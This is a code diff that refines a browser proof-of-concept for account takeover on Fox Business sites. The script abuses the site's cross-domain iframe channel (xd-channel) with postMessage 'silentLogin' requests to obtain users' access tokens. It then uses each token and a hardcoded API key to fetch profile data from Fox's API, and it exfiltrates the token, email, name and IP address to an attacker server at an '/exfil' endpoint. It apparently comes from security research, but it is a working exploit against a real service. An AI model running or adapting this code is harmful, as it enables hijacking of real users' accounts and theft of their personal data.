@@ -173,45 +173,67 @@ const server = http.createServer((req, res) => {
 (async function(){
   try {
     var SERVER = '${BASE_URL}';
+
+    // Remove old xd-channel iframe to avoid stale state
+    var old = document.getElementById('xdchannel');
+    if (old) old.remove();
+
+    // Wait 500ms for the postMessage flood from /poc to stop interfering
+    await new Promise(function(r){ setTimeout(r, 500) });
+
+    // Create a FRESH xd-channel iframe
     var tokenData = await new Promise(function(ok, fail) {
-      var t = setTimeout(function(){ fail('timeout') }, 10000);
+      var t = setTimeout(function(){ fail('timeout') }, 12000);
+
       window.addEventListener('message', function h(e) {
         if (e.origin !== 'https://my.foxbusiness.com') return;
         try {
           var d = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
           if (d.name === 'silentLogin' && d.data && d.data.token) {
-            clearTimeout(t); window.removeEventListener('message', h); ok(d.data);
+            clearTimeout(t);
+            window.removeEventListener('message', h);
+            ok(d.data);
           }
         } catch(x) {}
       });
-      var f = document.getElementById('xdchannel');
-      if (!f) {
-        f = document.createElement('iframe'); f.id = 'xdchannel';
-        f.src = 'https://my.foxbusiness.com/xd-channel.html?_x_auth=foxid&';
-        f.style.display = 'none';
-        (document.body || document.documentElement).appendChild(f);
-        f.onload = function() {
-          f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'silentLogin',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
+
+      var f = document.createElement('iframe');
+      f.id = 'xd-steal-' + Date.now();
+      f.src = 'https://my.foxbusiness.com/xd-channel.html?_x_auth=foxid&';
+      f.style.display = 'none';
+      (document.body || document.documentElement).appendChild(f);
+
+      f.onload = function() {
+        // Wait for ag.app.js inside iframe to initialize
+        setTimeout(function() {
           f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'hasPendingPasswordless',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
-        };
-      } else {
-        f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'silentLogin',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
-        f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'hasPendingPasswordless',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
-      }
+          f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'silentLogin',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
+        }, 1500);
+      };
     });
+
     var tk = tokenData.token;
+
+    // Alert the stolen token as proof
     alert('STOLEN ACCESS TOKEN:\\n\\n' + tk);
+
+    // Decode JWT to get profileId
     var parts = tk.split('.');
     var jwtPayload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
     var profileId = jwtPayload.uid;
+
+    // Call Fox API with stolen token
     var r = await fetch('https://api3.fox.com/v2.0/update/' + profileId, {
       headers: { 'Authorization': 'Bearer ' + tk, 'x-api-key': '4DfS6SQQBOoc2xImxylIam2ri8TXdHQV' }
     });
     var profile = await r.json();
+
+    // Exfiltrate to attacker
     await fetch(SERVER + '/exfil', {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ token:tk, profileId:profile.profileId, email:profile.email, displayName:profile.displayName, firstName:profile.firstName, viewerId:profile.viewerId, ipAddress:profile.ipAddress, domain:document.domain })
     });
+
     document.title = 'ATO: ' + profile.email;
     var b = document.createElement('div');
     b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;background:#d32f2f;color:#fff;padding:16px;font:bold 16px system-ui;text-align:center';
